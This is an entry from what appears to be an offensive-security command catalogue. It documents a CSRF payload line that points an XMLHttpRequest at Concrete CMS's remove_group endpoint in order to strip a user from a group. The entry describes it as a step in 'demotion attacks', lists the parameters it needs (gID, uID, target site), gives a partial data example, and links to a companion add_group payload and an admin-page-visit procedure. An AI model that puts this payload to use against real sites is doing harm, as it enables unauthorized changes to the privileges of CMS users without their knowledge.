---
id: cmd-uuid-002
data: >-
  XHR.open('POST',
  'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');
tags:
  - csrf
  - javascript
  - demotion
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.293Z'
verified: false
validated: true
submitted: true
---
# xmlhttprequest-csrf-remove-group

## Command

```javascript
XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');
```

## Description

This JavaScript snippet modifies an XMLHttpRequest to target the remove_group endpoint in Concrete CMS, forging a CSRF request to remove a user from a group. Integrate into full XHR script for demotion attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| gID | Group ID to remove from | Yes (in data) |
| uID | User ID to remove | Yes (in data) |
| <<site>> | Target site URL | Yes |

## Examples

### Basic Usage

```javascript
// Append to full XHR setup from add_group, changing the open() line
```

### Advanced Usage

```javascript
// Full script variant for removal
data = {gID:'3', uID:'8'}; // ... rest as in add_group but open remove_group
```

## Expected Output

Successful response indicating removal; user loses group access on next login.

## Related

- [[commands/xmlhttprequest-csrf-add-group]]
- [[procedures/Trigger-CSRF-via-Admin-Page-Visit]]
